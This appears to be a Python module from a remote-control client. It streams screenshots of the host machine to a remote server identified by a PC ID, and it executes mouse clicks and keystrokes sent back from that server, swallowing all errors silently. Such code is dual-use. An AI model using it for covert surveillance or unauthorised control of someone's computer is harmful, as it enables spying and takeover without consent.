import base64
from features.curlmanager import CurlManager
import io
from PIL import ImageGrab
import time
import threading
import pyautogui

class RemoteDesktopManager:
    """Class to manage remote desktop functionality"""
    def __init__(self, cfc_instance):
        """Initialize the RemoteDesktopManager"""
        self.cfc_instance = cfc_instance
        self.streaming = False
        self.stream_thread = None
        self.last_request_time = 0
        self.request_timeout = 10  # Stop streaming if no request for 5 seconds
        self.resolution = "normal"  # Default resolution
        self.sleep_interval = 0.5  # Default sleep interval (500ms for normal)
    
    def start_streaming(self):
        """Start continuous screenshot streaming"""
        try:
            if self.streaming:
                return

            self.streaming = True
            self.last_request_time = time.time()

            def send_screenshot():
                try:
                    while self.streaming:
                        # Check if we've received a recent request
                        if time.time() - self.last_request_time > self.request_timeout:
                            self.streaming = False
                            break
                        
                        # Capture screenshot
                        screenshot = ImageGrab.grab()
                        
                        # Apply resolution scaling based on setting
                        screenshot = self.apply_resolution(screenshot)
                        
                        # Convert to base64 for transmission
                        buffer = io.BytesIO()
                        screenshot.save(buffer, format='PNG')
                        screenshot_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                        
                        curl = CurlManager()
                        curl.set_headers(self.cfc_instance.headers)
                        
                        screen_data = {"data": screenshot_base64, "type": "screenshot"}
                        url = f"{self.cfc_instance.base_url}/remote_desktop?pc_id={self.cfc_instance.client_data['pc_id']}"
                        curl.post(url=url, json=screen_data)
                        time.sleep(self.sleep_interval)  # Dynamic delay based on resolution
                except Exception as e:
                    self.streaming = False
            
            self.stream_thread = threading.Thread(target=send_screenshot, daemon=True)
            self.stream_thread.start()
        except Exception as e:
            self.streaming = False
    
    def stop_streaming(self):
        """Stop continuous screenshot streaming"""
        self.streaming = False
        if self.stream_thread and self.stream_thread.is_alive():
            self.stream_thread.join(timeout=1)
    
    def apply_resolution(self, screenshot):
        """Apply resolution scaling to screenshot based on current setting"""
        try:
            width, height = screenshot.size
            
            # Define scaling factors for different resolutions
            resolution_scales = {
                'slowest': 1.0,    # Full resolution (highest quality)
                'slow': 0.8,       # 80% resolution
                'normal': 0.6,     # 60% resolution (default)
                'fast': 0.4,       # 40% resolution
                'fastest': 0.2     # 20% resolution (lowest quality)
            }
            
            scale = resolution_scales.get(self.resolution, 0.6)
            new_width = int(width * scale)
            new_height = int(height * scale)
            
            # Resize the screenshot
            resized_screenshot = screenshot.resize((new_width, new_height), ImageGrab.Image.Resampling.LANCZOS)
            return resized_screenshot
            
        except Exception as e:
            # If resizing fails, return original screenshot
            return screenshot
    
    def update_resolution(self, resolution):
        """Update resolution setting immediately"""
        self.resolution = resolution
        self.sleep_interval = self.get_sleep_interval(resolution)
    
    def get_sleep_interval(self, resolution):
        """Get sleep interval based on resolution setting"""
        intervals = {
            'slowest': 2.0,    # 2 seconds
            'slow': 1.0,       # 1 second
            'normal': 0.5,     # 500ms
            'fast': 0.25,      # 250ms
            'fastest': 0.1     # 100ms
        }
        return intervals.get(resolution, 0.5)  # Default to 500ms
    
    def handle_request(self, resolution=None):
        """Handle a screenshot request - update last request time and resolution"""
        self.last_request_time = time.time()
        
        # Update resolution if provided
        if resolution:
            self.resolution = resolution
            self.sleep_interval = self.get_sleep_interval(resolution)
            
        # If not currently streaming, start streaming
        if not self.streaming:
            self.start_streaming()

    def handle_click(self, data):
        """Handle mouse click on remote desktop"""
        try:
            screen_width, screen_height = pyautogui.size()
            
            x = int(data.get('x', 0) * screen_width)
            y = int(data.get('y', 0) * screen_height)
            
            button = data.get('button', 'left')
            
            if button == 'left':
                pyautogui.click(x, y)
            elif button == 'right':
                pyautogui.rightClick(x, y)
            elif button == 'middle':
                pyautogui.middleClick(x, y)
                        
        except Exception as e:
            pass
    
    def handle_keyboard(self, data):
        """Handle keyboard input on remote desktop"""
        try:
            key = data.get('key', '')
            modifiers = data.get('modifiers', [])
            type_ = data.get('type', '')
            
            key_mapping = {
                'Enter': 'enter',
                'Backspace': 'backspace',
                'Tab': 'tab',
                'Escape': 'esc',
                ' ': 'space',
                'ArrowUp': 'up',
                'ArrowDown': 'down',
                'ArrowLeft': 'left',
                'ArrowRight': 'right',
                'Delete': 'delete',
                'Insert': 'insert',
                'Home': 'home',
                'End': 'end',
                'PageUp': 'pageup',
                'PageDown': 'pagedown',
                'CapsLock': 'capslock',
                'NumLock': 'numlock',
                'ScrollLock': 'scrolllock',
                'PrintScreen': 'printscreen',
                'Pause': 'pause',
                'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4',
                'F5': 'f5', 'F6': 'f6', 'F7': 'f7', 'F8': 'f8',
                'F9': 'f9', 'F10': 'f10', 'F11': 'f11', 'F12': 'f12'
            }
            
            pyautogui_key = key_mapping.get(key, key.lower())
            
            if modifiers:
                key_combination = modifiers + [pyautogui_key]
                
                if type_ == 'KEYDOWN':
                    pyautogui.hotkey(*key_combination)
                elif type_ == 'KEYUP':
                    pass
            else:
                if type_ == 'KEYDOWN':
                    pyautogui.press(pyautogui_key)
                        
        except Exception as e:
            pass